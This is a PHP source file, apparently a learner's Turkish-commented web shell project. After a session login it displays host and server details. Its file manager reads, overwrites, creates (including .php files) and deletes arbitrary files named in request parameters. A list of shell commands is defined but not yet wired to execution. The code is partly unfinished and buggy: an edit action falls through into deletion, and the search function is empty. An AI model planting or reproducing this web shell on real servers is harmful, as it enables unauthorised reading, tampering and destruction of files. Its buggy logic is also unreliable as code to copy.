<?php
session_start();
error_reporting(0);

// Bu yol Windows sistemlerinde geçerli değil, sadece örnek
//echo nl2br(file_get_contents('C:\\Windows\\System32\\drivers\\etc\\hosts'));



if (!isset($_SESSION['logged'])) {
    header("Location: Login.php");
    exit();
}



if (isset($_GET['act']) && $_GET['act'] === 'logout') {
    session_unset();
    session_destroy();
    header("Location: Login.php");
    exit();
}

// File Menager Düzenliyorum

/*
$directory = 'C:/xampp/htdocs/webbShell';
if (is_dir($directory)) {
    if ($dh = opendir($directory)) {
        echo "<ul>";
       
        while (($file = readdir($dh)) !== false) {
            
            if ($file != '.' && $file != '..') {
                echo "<li><a href='?file=$directory/$file'>$file</a></li>";
            }
        }
        echo "</ul>";
        closedir($dh);
    }
}

if (isset($_GET['file'])) {
    $file = $_GET['file'];
    
    // Dosyanın gerçekten var olup olmadığını kontrol et
    if (file_exists($file)) {
        // Dosyanın içeriğini oku ve ekrana yazdır
        $content = file_get_contents($file);
        echo "<h2>Dosya İçeriği: " . basename($file) . "</h2>";
        echo "<pre>$content</pre>";
    } else {
        echo "Dosya bulunamadı.";
    }
}




// File Menager bitiş*/
$commands = [
    'ls' => 'Lists directory contents',
    'pwd' => 'Prints the current working directory',
    'cat' => 'Displays the content of a file',
    'whoami' => 'Displays the current user',
    'uname' => 'Prints system information',
    'phpinfo' => 'Displays PHP configuration info'
];

// Kullanıcının gönderdiği komutu al

// Function yönlendirmelerim burada: 

/*switch ($_GET['act']) {
    case 'info':
        $infoContent = $bajax->infoser(); // infoser() fonksiyonunu çağır
        echo "<script>
            document.getElementById('islemler').innerHTML = `{$infoContent}`;
        </script>";
        break;
    // Diğer case'ler...
    default:
        $r .= $bajax->logo();
        break;
}*/


//function yönlendirme bitir
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/main.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <title>Document</title>
</head>

<body>

    <div id="div_out">
        <li class="out_back"><a href="?act=logout" id="out">Logout</a></li>
        <li class="time"><?php echo date("H:i:s"); ?></li>
    </div>

    <div class="container">
        <div class="information">
            <?php
            echo '<span class="inf">Machine:</span> ' . php_uname() . "<br>";
            echo  '<span class="inf">Server:</span> ' . $_SERVER['SERVER_SOFTWARE'] . "<br>";
            echo '<span class="inf">Name:</span> ' . get_current_user() . "<br>";
            echo '<span class="inf">Server IP:</span> ' . gethostbyname($_SERVER['HTTP_HOST']) . "<br>";
            echo '<span class="inf">Your IP Address:</span> ' . $_SERVER['REMOTE_ADDR'] . "<br>";

            ?>
        </div>



        <!-- Menu ıtems is here -->

        <div class="menu">

            <li><a class="menu_items" href="?act=info" id="info">info</a></li>
            <li><a href="?act=f_menager" class="menu_items">File Menager</a></li>
            <li><a href="?act=Search" class="menu_items">Search</a></li>
            <li><a href="" class="menu_items">Command</a></li>
            <li><a href="" class="menu_items">Help</a></li>
        </div>


        <!-- My clas for functions -->
        <div class="islemler" id="islemler">
            <?php

            class fonksiyonlar
            {
                // function for informaion about machine//
                function infoser()
                {
                    echo " <br><br>";
                    echo '<span class="inf">Machine:</span> ' . php_uname() . "<br>";
                    echo  '<span class="inf">Server:</span> ' . $_SERVER['SERVER_SOFTWARE'] . "<br>";
                    echo '<span class="inf">Name:</span> ' . get_current_user() . "<br>";
                    echo '<span class="inf">Server IP:</span> ' . gethostbyname($_SERVER['HTTP_HOST']) . "<br>";
                    echo '<span class="inf">Your IP Address:</span> ' . $_SERVER['REMOTE_ADDR'] . "<br>";
                }

                // OUR LOGO
                function logo()
                {
                    $r = '';
                    $r .= '<br><br>';

                    $r .= "<div class='logo_cont'>";
                    $r .= "<img class= 'myLogo'src='img/logo.png'>";
                    $r .= "<img class= 'myLogo2' src='img/sibervatan_renkli.png'>";
                    $r .= "<img class= 'myLogo'src='img/logo.png'>";
                    $r .= "</div>";

                    return $r;
                }
                // Bugünlük mola : Dizine girmiyor! ilk açışta dosya tıklandığında bu bir dosya echosunu veriyor ama klasör içindeki dosyaya yapmıyor!




                //function for file menager//
                static function dizin($dizin_yolu)
                {


                    if (!is_dir($dizin_yolu) || is_file($dizin_yolu)) {
                        if (is_file($dizin_yolu)) {

                            echo "DOSYA:  " . htmlspecialchars($dizin_yolu) . "<br><br>";
                            $fopen = fopen($dizin_yolu, 'r');
                            $icerik = fread($fopen, filesize($dizin_yolu));
                            fclose($fopen);

                            $r = "";
                            $r .= "<form method='POST'>";
                            $r .= "<div class='show_file'>";
                            $r .= "<textarea name='read_File'> $icerik </textarea> ";
                            $r .= "<div class='container_of_the_AER twice_class_for_files'>
    
                                 <div class='editfie'><Button type='submit'>Edit</div>
                                 <div class='deletefile'><a href='?action=del_file&d=" . urlencode($dizin_yolu) . "'>Delete </a></div>  
                                 </div>";
                            $r .= "</div>";
                            $r .= "</form>";

                            echo $r;








                            if (isset($_POST['read_File'])) {
                                $eklenen = $_POST['read_File'];
                                $fopen = fopen($dizin_yolu, 'w');
                                fwrite($fopen,  $eklenen);
                                fclose($fopen);

                                echo "Değişiklikler Kaydedildi!";
                                header("Location: " . $_SERVER['REQUEST_URI']);
                                exit();
                            }
                        } else {
                            echo "Geçersiz dizin yolu: " . htmlspecialchars($dizin_yolu);
                        }
                        return;
                    }



                    $dir = opendir($dizin_yolu);
                    $v = ($dizin_yolu != ".") ? $dizin_yolu . "/" : "";

                    // Dizin içerisindeki dosya ve klasörleri listele
                    while (($item = readdir($dir)) !== false) {



                        // Klasörse
                        if (is_dir($v . $item)) {
                            echo '<div class="isdir"><a href="?action=opendir&d=' . $v . $item . '">' . $item . '</a></div>';
                        }

                        // Dosyaysa (Daha Açılmadı Açılcak)
                        if (is_file($v . $item)) {
                            echo '<div class="isfile"><a href="?action=openfile&f=' . $v . $item . '">' . $item . '</a></div>';
                        }
                    }


                    // echo "<br>"; onun yerine css de margin ekleyebilirim

                    echo "<div class='container_of_the_AER'>
                        <div class='addfile'> Add <i class='bx bx-chevrons-down'></i>
                        <li><a href='?action=addfile&d=" . urlencode($dizin_yolu) . "'>New File</a></li> 
                        <li><a href='?action=addfolder&d=" . urlencode($dizin_yolu) . "'>New Folder</a></li>
                        </div> 
                        <div class='editfie'><a href='?action=ed_file&d=" . urlencode($dizin_yolu) . " '>Edit </a></div>
                        <div class='deletefile'><a href='?action=del_file&d=" . urlencode($dizin_yolu) . "'>Delete </a></div> 
                         </div>";







                    closedir($dir);
                    chdir($dizin_yolu);
                    echo  " <div class='Show_dir'>" . htmlspecialchars(getcwd())  . "</div>";
                }





                //A Function For adding new dolder or new file
                static function newFolder($dizin_yolu, $tur)
                {

                    // if item in constructor is folder,
                    if ($tur === "klasor") {
                        if (isset($_POST['folder_name'])) {
                            $newFolderName = htmlspecialchars($_POST['folder_name']);

                            $fullPath = rtrim($dizin_yolu, '/') . '/' . $newFolderName;


                            if (!file_exists($fullPath)) {
                                mkdir($fullPath);
                                echo "<p>Klasör başarıyla oluşturuldu: $newFolderName</p>";
                            } else {
                                echo "<p>Klasör zaten var:<span class='hata_message'> $newFolderName </span></p>";
                            }
                        }

                        echo '<div class="newitem_container">';
                        echo "<form method='POST'>";
                        echo '<div class="newitem"> ';
                        echo "<div class='Show_dir_in_form'> DİZİN: " . $dizin_yolu . "</div>";
                        echo "<input type='text' name='folder_name' placeholder='Yeni Klasör Adı' required>";
                        echo "<input type='submit' value='Klasör Oluştur'>";
                        echo "</div>";
                        echo "</form>";
                        echo "</div>";



                        // if item in constructor is file,
                    } elseif ($tur === "dosya") {

                        if (isset($_POST['file_name'])) {
                            $valid_extensions = ['txt', 'png', 'php', 'pdf', 'html'];

                            $newFileName = htmlspecialchars($_POST['file_name']);
                            $extension = pathinfo($newFileName, PATHINFO_EXTENSION);

                            if (!in_array($extension, $valid_extensions)) {
                                echo "<p >Geçerli Uzantıyı gir! <span class='hata_message'>(txt , jpg , png , pdf, html)</span></p>";
                            } else {

                                $fullPath = rtrim($dizin_yolu, '/') . '/' . $newFileName;

                                if (!file_exists($fullPath)) {
                                    touch($fullPath);


                                    $eklenen = "Edit Yaparken önce değişikliği yapın ardından edit düğmesine basın...";
                                    $fopen = fopen($fullPath, 'w');
                                    fwrite($fopen,  $eklenen);
                                    fclose($fopen);



                                    echo "<p>Dosya Başarıyla Oluşturuldu: $newFileName</p>";
                                } else {
                                    echo "<p >Dosya zaten var: <span class='hata_message'> $newFileName </span></p>";
                                }
                            }
                        }


                        echo '<div class="newitem_container">';
                        echo "<form method='POST'>";
                        echo '<div class="newitem"> ';
                        echo "<div class='Show_dir_in_form'> DİZİN: " . $dizin_yolu . "</div>";
                        echo "<input type='text' name='file_name' placeholder='Dosya adı: (example.txt)' required>";
                        echo "<input type='submit' value='Dosya Oluştur'>";
                        echo "</div>";
                        echo "</form>";
                        echo "</div>";
                    }
                }



                //A function for serach form

                function search_form()
                {


                    echo "SEARCH HOSGELDİN";

                    $r = "";
                    $r .= '<div class="serach_container">';
                    $r .= "<form method='GET' action='?action=searching'>";
                    $r .= "<input name= 'search_dir' type= 'search' placeholder='Search...'>";
                    $r .= '<button type="submit">Ara</button>';
                    $r .= "</form></div>";
                    echo $r;
                }

                // A function for seraching

                function searchFile($file, $dizin){

                    
                }
                
            }

            // Sorunu buldum: İlk kez tıkladığında girmesinin ikinci kez tıkladığında girmemesinin sebebi: webshell dizinin altında test klasörü var ve bu klasöre tıkladığımızda içinmdeki elemanları sayabiliyor
            //Ama o elemanlardan birine daha tıkladığımızda webshell/test olarak set etmediğinden webshell/bostest olarak arıyor ve doğal olarak bulamıyor.
            // Deneme: Yarın test klasörünün içinde olan bostest adıyla aynı klasörü webshell altında da kur. ve onun içine de Basardın isimli biir klasör kur. ve sonra da test isimli klasörden bostest i aç ve Basardın dönecek.


            $r = '';

            $islem = new fonksiyonlar();
            if (isset($_GET['act'])) {
                switch ($_GET['act']) {
                    case 'info':
                        $r .= $islem->infoser();
                        break;

                    case 'f_menager':
                        $islem->dizin('.');
                        break;

                    case 'Search':
                        $islem->search_form();
                        break;



                    default:
                        $r .= $islem->logo();
                        break;
                }
            } else {
                $r .= $islem->logo();
            }



            if (isset($_GET['action'])) {
                switch ($_GET['action']) {
                    case 'opendir':
                        $d = strip_tags($_GET['d']);
                        fonksiyonlar::dizin($d);
                        break;

                    case 'openfile':
                        $f = strip_tags($_GET['f']);
                        // echo "Dosya açılacak: " . htmlspecialchars($d); ama o sonraki iş
                        fonksiyonlar::dizin($f);
                        break;

                    case 'addfolder':
                        $d = strip_tags($_GET['d']);
                        $t = "klasor";

                        fonksiyonlar::newFolder($d, $t);
                        break;

                    case 'addfile':
                        $d = strip_tags($_GET['d']);
                        $t = "dosya";
                        fonksiyonlar::newFolder($d, $t);
                        break;

                    case 'ed_file':
                        $d = strip_tags($_GET['d']);
                        if (is_dir($d)) {
                            echo "Hatalı Seçim: <span class='hata_message'> $d , bir klasör</span>";
                        } else if (is_file($d)) {
                            $d = strip_tags($_GET['d']);
                            echo $d;
                            fonksiyonlar::dizin($d);
                        }

                    case 'del_file':
                        $d = strip_tags($_GET['d']);
                        if (is_dir($d)) {
                            rmdir($d);
                            echo 'Klasör Başarıyla Silindi!';
                            exit();
                        } elseif (is_file($d)) {
                            unlink($d);
                            echo 'Dosya Başarıyla Silindi!';
                            exit();
                        }

                    case 'searching':
                        echo "Burası dogru";
                        if (isset($_GET['search_dir'])) {
                            $sorgu = strip_tags($_GET['search_dir']);
                            $anadizin = ".";
                            $r .= $islem->searchFile($sorgu, $anadizin);
                        }
                        break;





                    default:
                        fonksiyonlar::dizin(".");
                }
            }







            echo $r;
            ?>
        </div>



    </div>





</body>

</html>